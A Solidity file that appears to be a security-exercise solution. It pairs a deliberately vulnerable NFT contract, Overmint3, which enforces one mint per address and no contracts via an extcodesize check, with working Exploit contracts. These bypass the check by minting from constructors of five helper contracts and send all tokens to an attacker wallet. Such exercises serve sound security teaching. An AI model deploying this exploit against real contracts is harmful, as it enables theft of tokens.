// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.15;

import {Address} from "@openzeppelin/contracts/utils/Address.sol";
import {ERC721} from "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract Overmint3 is ERC721 {
    using Address for address;

    mapping(address => uint256) public amountMinted;
    uint256 public totalSupply;

    constructor() ERC721("Overmint3", "AT") {}

    function mint() external {
        require(!isContract(msg.sender), "no contracts");
        require(amountMinted[msg.sender] < 1, "only 1 NFT");
        totalSupply++;
        _safeMint(msg.sender, totalSupply);
        amountMinted[msg.sender]++;
    }

    //`isContract()` has been removed from OpenZeppelin's `Address` library in V5
    function isContract(address _addr) public view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(_addr)
        }
        return size > 0;
    }
}

contract Exploit {
    Overmint3 public overmint3Contract;
    address public attackerWallet;

    constructor(Overmint3 _overmint3Contract, address _attackerWallet) {
        overmint3Contract = _overmint3Contract;
        attackerWallet = _attackerWallet;
        new ExploitMedium(overmint3Contract, this);
        new ExploitMedium(overmint3Contract, this);
        new ExploitMedium(overmint3Contract, this);
        new ExploitMedium(overmint3Contract, this);
        new ExploitMedium(overmint3Contract, this);
    }

    function retrieve() public payable {
        uint256 balance = overmint3Contract.totalSupply();
        for (uint256 i = 1; i <= balance; i++) {
            overmint3Contract.transferFrom(address(this), attackerWallet, i);
        }
    }
}

contract ExploitMedium {
    Overmint3 public overmint3Contract;
    Exploit public exploitContract;

    constructor(Overmint3 _overmint3Contract, Exploit _exploitContract) {
        overmint3Contract = _overmint3Contract;
        exploitContract = _exploitContract;
        overmint3Contract.mint();
        uint256 tokenId = overmint3Contract.totalSupply();
        overmint3Contract.transferFrom(address(this), address(exploitContract), tokenId);
    }
}
